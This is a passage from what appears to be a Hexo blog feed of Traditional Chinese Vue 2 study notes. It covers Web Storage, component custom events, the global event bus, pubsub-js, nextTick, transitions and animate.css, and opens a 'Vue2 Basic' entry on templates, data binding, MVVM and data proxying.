<li><p><code>xxxxxStorage.removeItem(&#39;key&#39;)</code></p>
<ul>
<li>該方法接收一個鍵名作為參數，並把該鍵名從儲存中刪除</li>
</ul>
</li>
<li><p><code>xxxxxStorage.clear()</code></p>
<ul>
<li>該方法會清空存儲中所有數據</li>
</ul>
</li>
</ol>
</li>
<li><p>備註：</p>
<ol>
<li><code>SessionStorage</code>存儲的內容會隨著瀏覽器窗口關閉而消失</li>
<li><code>LocalStorage</code>存儲的內容需要手動清除才會消失</li>
<li><code>xxxxStorage.getItem(&#39;key&#39;)</code>如果key對應的value獲取不到，則返回null</li>
<li><code>JSON.parse(null)</code>的結果依然是null</li>
</ol>
</li>
</ol>
<h2 id="組件自定義事件"><a href="#組件自定義事件" class="headerlink" title="組件自定義事件"></a>組件自定義事件</h2><ol>
<li><p>一種組件鍵的通信方式，適用於：子組件 -&gt; 父組件</p>
</li>
<li><p>使用場景：子組件想給父組件傳遞數據，那麼就要在父組件中給子組件綁定自定義事件（事件的回調函數在A中）</p>
</li>
</ol>
<h3 id="綁定自定義事件"><a href="#綁定自定義事件" class="headerlink" title="綁定自定義事件"></a>綁定自定義事件</h3><ol>
<li><p>用<code>@</code>或<code>v-on</code>綁定自定義事件</p>
<ul>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;!-- 第一種方式：使用 @ 或 v-on 綁定自定義事件 --&gt;</span><br><span class="line">    &lt;Student @xxx=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;Student v-on:xxx=&quot;demo&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 配置事件回調函數</span><br><span class="line">    methods:&#123;</span><br><span class="line">        demo(para)&#123; ... &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一次性綁定自定義事件：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Student @xxx.once=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;Student v-on:xxx.once=&quot;demo&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用<code>ref</code>綁定自定義事件</p>
<ul>
<li><p>注意：通過<code>this.$refs.test.$on()</code>綁定事件時，回調函數<code>demo()</code><font color="#f54747">要麼配置在methods中，要麼使用箭頭函數</font>，否則this會指向子組件</p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;!-- 第二種方式：使用 ref 綁定自定義事件 --&gt;</span><br><span class="line">    &lt;Student ref=&quot;student&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 配置事件回調函數</span><br><span class="line">    methods:&#123;</span><br><span class="line">        demo(para)&#123; ... &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        this.$refs.student.$on(&#x27;xxx&#x27;, this.demo)</span><br><span class="line">        this.$refs.student.$on(&#x27;xxx&#x27;, () =&gt; &#123; ... &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>優勢：更加靈活，能追加其他需求</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 實現3秒後再綁定自定義事件</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">student</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一次性綁定自定義事件：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    // 更換 $on API為 $once</span><br><span class="line">    this.$refs.test.$once(&#x27;event&#x27;, this.demo)</span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="觸發自定義事件"><a href="#觸發自定義事件" class="headerlink" title="觸發自定義事件"></a>觸發自定義事件</h3><ul>
<li><p>使用<code>$emit()</code>觸發自定義事件</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;button @click=&quot;sendStudentName&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        sendStudentName()&#123;</span><br><span class="line">            // 觸發子組件身上的xxx事件</span><br><span class="line">            this.$emit(&#x27;xxx&#x27;, param1, param2, ...)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>自定義事件回調函數接收參數</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="comment">// 接收一個參數</span></span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">param</span>)&#123; ... &#125;</span><br><span class="line">    <span class="comment">// 接收多個參數，封裝到 params[]</span></span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">...params</span>)&#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="解綁自定義事件"><a href="#解綁自定義事件" class="headerlink" title="解綁自定義事件"></a>解綁自定義事件</h3><ul>
<li>使用<code>$off</code>解綁自定義事件  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;button @click=&quot;unbind&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        unbind()&#123;</span><br><span class="line">            this.$off(&#x27;event&#x27;)          // 解綁單一事件</span><br><span class="line">            this.$off([&#x27;e1&#x27;,&#x27;e2&#x27;])      // 解綁多項事件</span><br><span class="line">            this.$off()                 // 解綁全部事件</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="綁定原生事件"><a href="#綁定原生事件" class="headerlink" title="綁定原生事件"></a>綁定原生事件</h3><ul>
<li>組件上也可以綁定原生DOM事件，需要使用<code>native</code>修飾符  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Student @click.native=&quot;funct&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="全局事件總線"><a href="#全局事件總線" class="headerlink" title="全局事件總線"></a>全局事件總線</h2><ol>
<li><p>全局事件總線(Global Event Bus)是一種組件間通信的方式，適用於任意組件間通信</p>
</li>
<li><p>在<code>main.js</code>安裝全局事件總線</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="title function_">beforeCreate</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = <span class="variable language_">this</span>   <span class="comment">// 安裝全局事件總線</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>使用事件總線  </p>
<ol>
<li><p>接收數據：  </p>
<ul>
<li>A組件想接收數據，則在A組件中給<code>$bus</code>綁定自定義事件，事件在回調留在A組件身上 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">data</span>)&#123;...&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 配置在methods中</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    <span class="comment">// 使用箭頭函數</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">beforeDestory</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$off(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>提供數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$bus</span>.$emit(<span class="string">&#x27;xxx&#x27;</span>, data)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="消息訂閱與發布"><a href="#消息訂閱與發布" class="headerlink" title="消息訂閱與發布"></a>消息訂閱與發布</h2><ol>
<li><p>消息訂閱與發布 (pubsub) 是一種組件間通信的方式，適用於任意組件間通信</p>
</li>
<li><p>安裝pubsub</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i pubsub-js</span><br></pre></td></tr></table></figure>

</li>
<li><p>在<code>main.js</code>引入</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pubsub <span class="keyword">from</span> <span class="string">&#x27;pubsub-js&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>使用pubsub</p>
<ol>
<li><p>接收數據：  </p>
<ul>
<li>A組件想接收數據，則在A組件中訂閱消息，訂閱的回調留在A組件自身中 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">data</span>)&#123;...&#125;</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="function">(<span class="params">parameters</span>) =&gt;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">beforeDestory</span>(<span class="params"></span>)&#123;</span><br><span class="line">    pubsub.<span class="title function_">unsubscribe</span>(<span class="variable language_">this</span>.<span class="property">pid</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>提供數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pubsub.<span class="title function_">publish</span>(<span class="string">&#x27;xxx&#x27;</span>, data)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol>
<li><p>解析順序的問題：</p>
<ul>
<li>使用<code>v-show</code>時，由於元素在調用函數時並沒有來到頁面上，因此對元素的操作無效</li>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 點擊按鈕時出現input框並獲取焦點 --&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-show=&quot;item.isEdit&quot; ref=&quot;inputTitle&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;handleEdit(item)&quot;&gt;Edit&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        handleEdit(item)&#123;</span><br><span class="line">            if(item.hasOwnProperty(&#x27;isEdit&#x27;))&#123;</span><br><span class="line">                item.isEdit = true</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                this.$set(item, &#x27;isEdit&#x27;, true)</span><br><span class="line">            &#125;</span><br><span class="line">            // 由於調用函數時，input框還沒有來到頁面上，因此無法獲取焦點</span><br><span class="line">            this.$refs.inputTitle.focus()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用<code>nextTick()</code>方法</p>
<ul>
<li>作用：在下一次DOM更新結束後，執行其指定代碼</li>
<li>當改變數據後，要基於更新後的新DOM進行某些操作時，要在<code>nextTick</code>所制定的回調函數中執行</li>
</ul>
</li>
<li><p>語法：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(回調函數)</span><br></pre></td></tr></table></figure>

</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在DOM更新完畢後執行函數</span></span><br><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// DOM更新完畢，input框已經在頁面上，就可以獲取焦點了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inputTitle</span>.<span class="title function_">focus</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="過渡與動畫"><a href="#過渡與動畫" class="headerlink" title="過渡與動畫"></a>過渡與動畫</h2><ol>
<li><p>作用：在插入、更新或移除DOM元素時，在合適的時候給元素添加樣式類名</p>
</li>
<li><p>語法：  </p>
<ol>
<li><p>樣式：  </p>
<ul>
<li><p>元素進入的樣式：</p>
<ol>
<li><code>v-enter</code> 進入的起點</li>
<li><code>v-enter-active</code> 進入過程中（進入的時候被激活）</li>
<li><code>v-enter-to</code> 進入的終點</li>
</ol>
</li>
<li><p>元素離開的樣式：</p>
<ol>
<li><code>v-leave</code> 離開的起點</li>
<li><code>v-leave-active</code> 離開過程中</li>
<li><code>v-leave-to</code> 離開的終點</li>
</ol>
</li>
</ul>
</li>
<li><p>使用<code>&lt;transition&gt;</code>包裹要過度的元素，並配置name屬性：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>Hello<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 樣式：</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">xxx-enter&#123;...&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>備註：若有多個元素需要過渡，則需要使用<code>&lt;transition-group&gt;</code>，切每一個元素都要指定的<code>key</code>值</p>
</li>
</ol>
</li>
<li><p>其他：</p>
<ul>
<li>初始引入動畫，在<code>&lt;transition&gt;</code>中加入<code>appear</code></li>
</ul>
</li>
</ol>
<h2 id="動畫庫"><a href="#動畫庫" class="headerlink" title="動畫庫"></a>動畫庫</h2><ol>
<li><p>安裝：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install animate.<span class="property">css</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>引入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;animate.css&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>使用：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;animate__animated animate__bounce&quot;</span></span></span><br><span class="line"><span class="tag">    &lt;!<span class="attr">--</span> <span class="attr">複製粘貼已配置的動畫名xxx</span> <span class="attr">--</span>&gt;</span></span><br><span class="line">    enter-active-class=&quot;xxx&quot;</span><br><span class="line">    leave-active-class=&quot;xxx&quot;</span><br><span class="line">&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://animate.style/&quot;</span>&gt;</span>animate.css官網<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vue2 Basic</title>
    <url>/myBlog/2022/06/08/2022/FrontEnd/2022-6-8-Vue2JS-Basic/</url>
    <content><![CDATA[<h1 id="Vue2-Basic"><a href="#Vue2-Basic" class="headerlink" title="Vue2 Basic"></a>Vue2 Basic</h1><h2 id="Vue簡介"><a href="#Vue簡介" class="headerlink" title="Vue簡介"></a>Vue簡介</h2><ul>
<li><p>Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）</p>
</li>
<li><p>Vue的特點：</p>
<ol>
<li>採用組件化模式，提高代碼複用率和更好維護<br> 在一個 .vue 裏面就是一個組件，包含 html&#x2F;css&#x2F;js</li>
<li>聲明式編碼，無需直接操作DOM，提高開發效率<br> 聲明式編碼 vs 命令式編碼<br> 命令式編碼：清楚列明每一個操作步驟<br> 聲明式編碼：用語法直接讓React佢操作DOM</li>
<li>使用虛擬DOM + 優秀的Diff算法，儘量複用DOM節點</li>
</ol>
</li>
</ul>
<h2 id="Vue操作"><a href="#Vue操作" class="headerlink" title="Vue操作"></a>Vue操作</h2><ul>
<li><p>Vue操作：</p>
<ol>
<li>想讓Vue工作，就必須創建一個Vue實例，且要傳入一個配置對象</li>
<li>root容器中的代碼依然符合html規範，只不過混入了一些特殊的Vue語法</li>
<li>root容器中的代碼被稱為 “Vue模板”</li>
<li>Vue實例和容器是<font color="#f54747">一對一</font>的</li>
<li>真實開發中有一個Vue實例，並且會配合著組件一起使用</li>
<li><code>&#123;&#123;xxx&#125;&#125;</code>中的<code>xxx</code>要寫JS表達式，且<code>xxx</code>可以自動讀取<code>data</code>中的所有屬性</li>
<li>一旦data中的數據發生改變，那麼頁面中用到該數據的地方也會自動更新</li>
</ol>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 準備一個容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;, &#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建Vue實例</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,      <span class="comment">// element 用於指定當前Vue實例為哪個容器服務，值通常為css選擇棄字符串</span></span><br><span class="line">    <span class="attr">data</span>:&#123; <span class="comment">// data中用於存儲數據，數據共el所指定的容器去使用，值暫時先寫成一個對象</span></span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">gender</span>: <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意區分：<font color="#f54747">JS表達式</font> 和 <font color="#f54747">JS代碼&#x2F;語句</font></p>
<ul>
<li>JS表達式：一個表達式會生成一個值，可以放在任何一個地方<ol>
<li><code>a</code></li>
<li><code>a+b</code></li>
<li><code>demo(1)</code></li>
<li><code>x === y ? &#39;a&#39; : &#39;b&#39;</code></li>
</ol>
</li>
<li>JS語句：<ol>
<li><code>if()&#123;&#125;</code></li>
<li><code>for()&#123;&#125;</code></li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="模塊語法"><a href="#模塊語法" class="headerlink" title="模塊語法"></a>模塊語法</h2><ol>
<li><p>插值語法：<br> 功能：用於解析標籤體的內容<br> 寫法：<code>&#123;&#123;xxx&#125;&#125;</code>, <code>xxx</code>是JS表達式，且可以直接讀取到<code>data</code>中的所有屬性</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h3&gt;Hello, &#123;&#123;name&#125;&#125;&lt;/h3&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>指令語法：<br> 功能：用於解析標籤 (包括：標籤屬性、標籤體內容、綁定時間…)<br> 舉例：<code>v-bind:href=&quot;xxx&quot;</code> 或 簡寫為 <code>:href=&quot;xxx&quot;</code>, <code>xxx</code>同為JS表達式，且可以直接讀取到<code>data</code>中的所有屬性<br> 備註：Vue中有很多的指令，且形式都是: <code>v-yyy</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a v-bind:href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;a :href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125; 2&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>Vue實例  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">link</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Google&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;http://www.google.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="數據綁定"><a href="#數據綁定" class="headerlink" title="數據綁定"></a>數據綁定</h2><ol>
<li><p>單向數據綁定(<code>v-bind</code>)：數據只能從<code>data</code>流向頁面</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>雙向數據綁定(<code>v-model</code>)：數據不僅能從data流向頁面，還可以從頁面留向<code>data</code></p>
<ul>
<li>雙向綁定一般都應用在表單類元素上 (如：<code>input</code>、<code>select</code>等)</li>
<li><code>v-model:value</code>可以簡寫為<code>v-model</code>，因為<code>v-model</code>默認收集的就是<code>value</code>值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="el和data寫法"><a href="#el和data寫法" class="headerlink" title="el和data寫法"></a>el和data寫法</h2><ol>
<li><p><code>el</code>的兩種寫法：</p>
<ol>
<li><code>new Vue</code>時配置<code>el</code>的屬性</li>
<li>先創建Vue實例，隨後再通過 <code>vm.$mount(&#39;#root&#39;)</code>指定<code>el</code>的值</li>
</ol>
</li>
<li><p><code>data</code>的兩種寫法：</p>
<ol>
<li><p>對象式</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>函數式<font color="#f54747">（推薦使用，因為後續會報錯）</font><br> 備註：由Vue管理的函數，<font color="#f54747">一定不要寫箭頭函數</font>，一旦寫了箭頭函數，<code>this</code>就不再是Vue實例了</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="MVVM模型"><a href="#MVVM模型" class="headerlink" title="MVVM模型"></a>MVVM模型</h2><ol>
<li><p>MVVM模型：</p>
 <img src="https://p.ipic.vip/5hwti8.jpg" width="600px"/>
 1. M：模型(Model)：對應data中的數據
 2. V：視圖(View)：模板
 3. VM：視圖模型(ViewModel)：Vue實例對象
     - 而在文檔中經常會使用 `vm`(ViewModel) 這個變量名來表示Vue實例

</li>
<li><p>觀察發現：</p>
<ol>
<li><code>data</code>中所有的屬性，最後都出現在<code>vm</code>身上</li>
<li><code>vm</code>身上的所有屬性 及 Vue原型上的所有屬性，在Vue模板中都可以直接使用</li>
</ol>
</li>
</ol>
<h2 id="數據代理"><a href="#數據代理" class="headerlink" title="數據代理"></a>數據代理</h2><ol>
<li><p><code>defineProperty</code>方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">value</span>:<span class="number">18</span>,</span><br><span class="line">    <span class="attr">enumerable</span>:<span class="literal">true</span>,       <span class="comment">// 控制屬性是否可以枚舉，默認值為false</span></span><br><span class="line">    <span class="attr">writable</span>:<span class="literal">true</span>,         <span class="comment">// 控制屬性是否可以被修改，默認值為false</span></span><br><span class="line">    <span class="attr">configurable</span>:<span class="literal">true</span>,     <span class="comment">// 控制屬性是否可以被刪除，默認值為false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 當有人讀取person的age屬性時，get函數(getter)就會被調用，且返回值就是age的值</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> number</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 當有人修改person的age屬性時，set函數(setter)就會被調用，且會收到修改的具體值</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        number = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>數據代理</p>
<ol>
<li><p>Vue中的數據代理：</p>
<ul>
<li>通過<code>vm</code>對象來代理<code>data</code>對象中屬性的操作(讀&#x2F;寫) (getter&#x2F;setter)</li>
</ul>
</li>
<li><p>Vue中的數據方法：</p>
<ul>
<li>更加方便的操作<code>data</code>中的數據</li>
</ul>
</li>
<li><p>基本原理：</p>
<ul>
<li>通過<code>Object.defineProperty()</code>方法把<code>data</code>對象中所有屬性添加到<code>vm</code>上</li>
<li>為每一個添加到vm的屬性，都指定一個<code>getter</code>和<code>setter</code></li>
<li>在<code>getter</code>&#x2F;<code>setter</code>內部去操作(讀&#x2F;寫)<code>data</code>中響應的屬性</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="事件處理"><a href="#事件處理" class="headerlink" title="事件處理"></a>事件處理</h2><h3 id="事件的基本使用"><a href="#事件的基本使用" class="headerlink" title="事件的基本使用"></a>事件的基本使用</h3><ol>
<li><p>使用<code>v-on:xxx</code>或<code>@xxx</code>綁定事件，其中<code>xxx</code>是事件名</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 不傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;!-- 傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
